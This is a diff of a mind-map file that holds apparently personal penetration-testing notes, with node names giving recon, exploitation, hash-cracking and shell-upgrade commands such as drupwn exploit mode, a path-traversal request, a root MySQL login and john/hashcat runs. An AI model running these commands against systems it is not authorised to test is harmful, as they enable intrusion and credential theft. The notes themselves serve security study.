@@ -14,40 +14,40 @@
     <style level="9" isset="false" linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true" connectiondash="dotted" connectionwidth="2" connectionarrow="fromto" connectionpadding="3" connectionfont="Sans 10"/>
     <style level="10" isset="false" linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true" connectiondash="dotted" connectionwidth="2" connectionarrow="fromto" connectionpadding="3" connectionfont="Sans 10"/>
   </styles>
-  <drawarea x="-2570.8653093563539" y="-516.67959594726653" scale="0.75"/>
+  <drawarea x="-649.34842427570038" y="-196.15559895833502" scale="0.75"/>
   <images/>
   <nodes>
-    <node id="1" posx="3165.843870757732" posy="834.66860961914085" maxwidth="200" width="75" height="46" side="left" fold="false" treesize="2458.3259582519545" layout="Manual">
+    <node id="1" posx="1244.3269856770783" posy="514.14461263020939" maxwidth="200" width="75" height="46" side="left" fold="false" treesize="3106.8411966959648" layout="Manual">
       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
       <formatting/>
       <nodename>attack</nodename>
       <nodenote></nodenote>
       <nodes>
-        <node id="3" posx="2954.8438707577238" posy="-247.33951822916674" maxwidth="200" width="111" height="46" side="left" fold="false" treesize="551.00000000000023" color="#b58900" colorroot="false" layout="Manual">
+        <node id="3" posx="1033.3269856770712" posy="-859.56279500325422" maxwidth="200" width="111" height="46" side="left" fold="false" treesize="532.99999999999966" color="#b58900" colorroot="false" layout="Manual">
           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
           <formatting/>
           <nodename>Explotation</nodename>
           <nodenote></nodenote>
           <nodes>
-            <node id="5" posx="2739.8438707577229" posy="-499.33951822916691" maxwidth="200" width="115" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+            <node id="5" posx="818.32698567706939" posy="-1102.5627950032542" maxwidth="200" width="115" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>frameworks</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="7" posx="2533.843870757722" posy="-499.33951822916691" maxwidth="200" width="106" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="7" posx="612.32698567706848" posy="-1102.5627950032542" maxwidth="200" width="106" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>metasploit</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="9" posx="2332.843870757722" posy="-499.33951822916691" maxwidth="200" width="101" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="9" posx="411.32698567706848" posy="-1102.5627950032542" maxwidth="200" width="101" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>msfdb init</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="11" posx="2121.8438707577211" posy="-499.33951822916691" maxwidth="200" width="111" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                        <node id="11" posx="200.32698567706711" posy="-1102.5627950032542" maxwidth="200" width="111" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>msfconsole</nodename>
@@ -59,19 +59,19 @@
                 </node>
               </nodes>
             </node>
-            <node id="13" posx="2697.8438707577211" posy="-453.33951822916691" maxwidth="200" width="157" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+            <node id="13" posx="776.32698567706768" posy="-1056.5627950032551" maxwidth="200" width="157" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>Network Services</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="15" posx="2544.843870757722" posy="-453.33951822916691" maxwidth="200" width="53" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="15" posx="623.32698567706848" posy="-1056.5627950032551" maxwidth="200" width="53" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ssh</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="17" posx="2266.843870757722" posy="-453.33951822916691" maxwidth="200" width="178" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="17" posx="343.99890136717261" posy="-1056.5627950032551" maxwidth="200" width="178" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>metasploit/ssh_login</nodename>
@@ -81,31 +81,31 @@
                 </node>
               </nodes>
             </node>
-            <node id="19" posx="2700.843870757722" posy="-361.33951822916697" maxwidth="200" width="154" height="46" side="left" fold="true" treesize="138" color="#b58900" colorroot="false" layout="Manual">
+            <node id="19" posx="779.32698567706859" posy="-964.56279500325513" maxwidth="200" width="154" height="46" side="left" fold="true" treesize="138" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>Web Applications</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="21" posx="2540.843870757722" posy="-384.33951822916697" maxwidth="200" width="60" height="46" side="left" fold="true" treesize="92" color="#b58900" colorroot="false" layout="Manual">
+                <node id="21" posx="619.32698567706848" posy="-987.56279500325513" maxwidth="200" width="60" height="46" side="left" fold="true" treesize="92" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>CMS</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="23" posx="2364.843870757722" posy="-384.33951822916697" maxwidth="200" width="76" height="46" side="left" fold="true" treesize="92" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="23" posx="443.32698567706848" posy="-987.56279500325513" maxwidth="200" width="76" height="46" side="left" fold="true" treesize="92" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>Drupal</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="25" posx="1968.8438707577218" posy="-407.33951822916697" maxwidth="268.64275105794275" width="296" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                        <node id="25" posx="47.326985677067114" posy="-1010.5627950032551" maxwidth="268.64275105794275" width="296" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>drupwn --mode exploit --target $URL</nodename>
                           <nodenote></nodenote>
                         </node>
-                        <node id="27" posx="2009.8438707577218" posy="-361.33951822916697" maxwidth="237.34073893229163" width="255" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                        <node id="27" posx="88.326985677067114" posy="-964.56279500325513" maxwidth="237.34073893229163" width="255" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename>droopescan scan drupal -u $url</nodename>
@@ -115,13 +115,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="29" posx="2498.8438707577211" posy="-315.33951822916674" maxwidth="200" width="102" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="29" posx="577.32698567706757" posy="-918.56279500325445" maxwidth="200" width="102" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>uploadFile</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="31" posx="2119.843870757722" posy="-315.33951822916674" maxwidth="262.69437662760413" width="279" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="31" posx="198.32698567706802" posy="-918.56279500325445" maxwidth="262.69437662760413" width="279" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>GET /show_image?img=../../../../../</nodename>
@@ -131,25 +131,25 @@
                 </node>
               </nodes>
             </node>
-            <node id="33" posx="2784.8438707577247" posy="-269.33951822916674" maxwidth="200" width="70" height="46" side="left" fold="false" treesize="64" color="#b58900" colorroot="false" layout="Manual">
+            <node id="33" posx="863.32698567707121" posy="-881.56279500325422" maxwidth="200" width="70" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>BBDD</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="35" posx="2319.8438707577238" posy="-269.33951822916674" maxwidth="373.33968098958331" width="381" height="46" side="left" fold="false" treesize="64" color="#b58900" colorroot="false" layout="Manual">
+                <node id="35" posx="398.3269856770703" posy="-881.56279500325422" maxwidth="373.33968098958331" width="381" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>mysql --host=db --user=root --password=root</nodename>
                   <nodenote>mysql -h localhost/SSA -P 9000 -u atlas</nodenote>
                   <nodes>
-                    <node id="37" posx="1710.8438707577234" posy="-269.33951822916674" maxwidth="483.96968587239576" width="469" height="64" side="left" fold="false" treesize="64" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="37" posx="-210.67301432293107" posy="-881.56279500325422" maxwidth="483.96968587239576" width="469" height="64" side="left" fold="true" treesize="64" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>show databases; use $DB, show tables; show columns from table; select * FROM $colum;</nodename>
                       <nodenote></nodenote>
                       <nodes>
-                        <node id="39" posx="1582.8438707577234" posy="-268.83951822916674" maxwidth="200" width="28" height="45" side="left" fold="false" treesize="45" color="#b58900" colorroot="false" layout="Manual">
+                        <node id="39" posx="-338.67301432293107" posy="-987.06922403971316" maxwidth="200" width="28" height="45" side="left" fold="true" treesize="45" color="#b58900" colorroot="false" layout="Manual">
                           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                           <formatting/>
                           <nodename></nodename>
@@ -161,25 +161,25 @@
                 </node>
               </nodes>
             </node>
-            <node id="41" posx="2764.8438707577247" posy="-154.83951822916674" maxwidth="200" width="90" height="46" side="left" fold="false" treesize="138" color="#b58900" colorroot="false" layout="Manual">
+            <node id="41" posx="843.32698567707121" posy="-776.06279500325422" maxwidth="200" width="90" height="46" side="left" fold="false" treesize="138" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>cracking</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="43" posx="2539.8438707577238" posy="-223.33951822916674" maxwidth="200" width="125" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="43" posx="618.3269856770703" posy="-844.56279500325422" maxwidth="200" width="125" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>hashid $hash</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="45" posx="2388.8438707577238" posy="-177.33951822916674" maxwidth="254.65706380208348" width="276" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="45" posx="467.3269856770703" posy="-798.56279500325422" maxwidth="254.65706380208348" width="276" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>john --list=formats | grep -i $hash</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="47" posx="1728.8438707577234" posy="-177.33951822916674" maxwidth="532.00956217447924" width="560" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                    <node id="47" posx="-192.67301432293107" posy="-798.56279500325422" maxwidth="532.00956217447924" width="560" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>john --format=$format --wordlist=/usr/share/wordlists/rockyou.txt $hash</nodename>
@@ -187,7 +187,7 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="49" posx="2320.8438707577247" posy="-131.33951822916674" maxwidth="321.32633463541663" width="344" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="49" posx="399.32698567707121" posy="-752.56279500325422" maxwidth="321.32633463541663" width="344" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>hashcat -m value -a value hashfile wordlist</nodename>
@@ -195,13 +195,13 @@
                 </node>
               </nodes>
             </node>
-            <node id="51" posx="2703.8438707577238" posy="-40.339518229166515" maxwidth="200" width="151" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+            <node id="51" posx="782.32698567707041" posy="-661.56279500325422" maxwidth="200" width="151" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>puntos montajes</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="53" posx="2519.8438707577238" posy="-40.339518229166515" maxwidth="200" width="84" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+                <node id="53" posx="598.3269856770703" posy="-661.56279500325422" maxwidth="200" width="84" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>findmnt</nodename>
@@ -209,7 +209,7 @@
                 </node>
               </nodes>
             </node>
-            <node id="55" posx="2826.8438707577247" posy="5.6604817708334849" maxwidth="200" width="101" height="46" side="left" fold="false" treesize="46" color="#b58900" colorroot="false" layout="Manual">
+            <node id="55" posx="905.32698567707246" posy="-615.56279500325445" maxwidth="200" width="101" height="46" side="left" fold="true" treesize="46" color="#b58900" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>oracle-tns</nodename>
@@ -217,25 +217,25 @@
             </node>
           </nodes>
         </node>
-        <node id="57" posx="2974.8438707577266" posy="73.660481770832575" maxwidth="200" width="91" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
+        <node id="57" posx="1053.3269856770739" posy="-538.56279500325536" maxwidth="200" width="91" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
           <formatting/>
           <nodename>PostExpl</nodename>
           <nodenote></nodenote>
           <nodes>
-            <node id="59" posx="2780.8438707577266" posy="50.66048177083303" maxwidth="200" width="94" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
+            <node id="59" posx="859.32698567707303" posy="-561.56279500325491" maxwidth="200" width="94" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>revshells</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="61" posx="2316.8438707577257" posy="50.66048177083303" maxwidth="338.98223876953125" width="364" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
+                <node id="61" posx="395.32698567707212" posy="-607.56279500325536" maxwidth="338.98223876953125" width="364" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>python -c 'import pty; pty.spawn("/bin/bash")'</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="63" posx="1842.8438707577254" posy="50.66048177083303" maxwidth="347.49578857421875" width="374" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
+                    <node id="63" posx="-78.673014322929248" posy="-607.56279500325536" maxwidth="347.49578857421875" width="374" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>export TERM=xterm (ctrl+z) stty raw -echo; fg</nodename>
@@ -245,7 +245,7 @@
                 </node>
               </nodes>
             </node>
-            <node id="65" posx="2732.8438707577293" posy="96.660481770832575" maxwidth="200" width="142" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
+            <node id="65" posx="811.32698567707575" posy="-515.56279500325536" maxwidth="200" width="142" height="46" side="left" fold="true" treesize="46" color="#cb4b16" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>pentestmonkey</nodename>
@@ -253,25 +253,25 @@
             </node>
           </nodes>
         </node>
-        <node id="67" posx="2992.843870757732" posy="990.41860961913994" maxwidth="200" width="73" height="46" side="left" fold="false" treesize="2164.3493619529172" color="#dc322f" colorroot="false" layout="Manual">
+        <node id="67" posx="1071.3269856770787" posy="669.89461263020826" maxwidth="200" width="73" height="46" side="left" fold="false" treesize="2822.2439338930221" color="#dc322f" colorroot="false" layout="Manual">
           <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
           <formatting/>
           <nodename>Recon</nodename>
           <nodenote></nodenote>
           <nodes>
-            <node id="69" posx="2587.8292223202311" posy="160.41281127929551" maxwidth="200" width="93" height="46" side="left" fold="false" treesize="92.000000000000455" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="69" posx="666.31233723957803" posy="-452.18979899088612" maxwidth="200" width="93" height="46" side="left" fold="false" treesize="92.000000000000455" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>ip sweep</nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="71" posx="2418.8292223202284" posy="137.41281127929551" maxwidth="200" width="69" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="71" posx="497.31233723957484" posy="-475.18979899088612" maxwidth="200" width="69" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>nmap</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="73" posx="2152.8292223202293" posy="137.41281127929551" maxwidth="200" width="166" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="73" posx="231.3123372395753" posy="-475.18979899088612" maxwidth="200" width="166" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>nmap -sn rango/24</nodename>
@@ -279,13 +279,13 @@
                     </node>
                   </nodes>
                 </node>
-                <node id="75" posx="2373.8292223202293" posy="183.41281127929597" maxwidth="200" width="114" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="75" posx="452.31233723957575" posy="-429.18979899088561" maxwidth="200" width="114" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>netdiscover</nodename>
                   <nodenote></nodenote>
                   <nodes>
-                    <node id="77" posx="2073.8292223202302" posy="183.41281127929597" maxwidth="200" width="200" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                    <node id="77" posx="152.31233723957621" posy="-429.18979899088561" maxwidth="200" width="200" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                       <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                       <formatting/>
                       <nodename>netdiscover -r rango/24</nodename>
@@ -295,19 +295,19 @@
                 </node>
               </nodes>
             </node>
-            <node id="79" posx="2655.4936103410651" posy="352.07585652669104" maxwidth="200" width="152" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="79" posx="819.32698567707939" posy="-794.96553220031069" maxwidth="200" width="152" height="46" side="left" fold="false" treesize="92.000000000000455" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
               <nodename>SO enumeration </nodename>
               <nodenote></nodenote>
               <nodes>
-                <node id="81" posx="2436.4936103410632" posy="329.07585652669059" maxwidth="200" width="119" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="81" posx="600.32698567707689" posy="-817.96553220031115" maxwidth="200" width="119" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>nmap $IP -O</nodename>
                   <nodenote></nodenote>
                 </node>
-                <node id="83" posx="2469.4936103410623" posy="375.07585652669104" maxwidth="200" width="86" height="46" side="left" fold="true" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
+                <node id="83" posx="633.32698567707598" posy="-771.96553220031069" maxwidth="200" width="86" height="46" side="left" fold="false" treesize="46" color="#dc322f" colorroot="false" layout="Manual">
                   <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
                   <formatting/>
                   <nodename>ping $IP</nodename>
@@ -315,31 +315,31 @@
                 </node>
               </nodes>
             </node>
-            <node id="85" posx="2112.3119303385433" posy="386.62096478862054" maxwidth="200" width="179" height="46" side="left" fold="false" treesize="867.98388671874955" color="#dc322f" colorroot="false" layout="Manual">
+            <node id="85" posx="190.79504525788934" posy="-133.98164548156075" maxwidth="200" width="179" height="46" side="left" fold="false" treesize="867.98388671874955" color="#dc322f" colorroot="false" layout="Manual">
               <style linktype="straight" linkwidth="4" linkarrow="false" linkdash="solid" nodeborder="underlined" nodewidth="200" nodeborderwidth="4" nodefill="false" nodemargin="8" nodepadding="6" nodefont="Sans 11" nodemarkup="true"/>
               <formatting/>
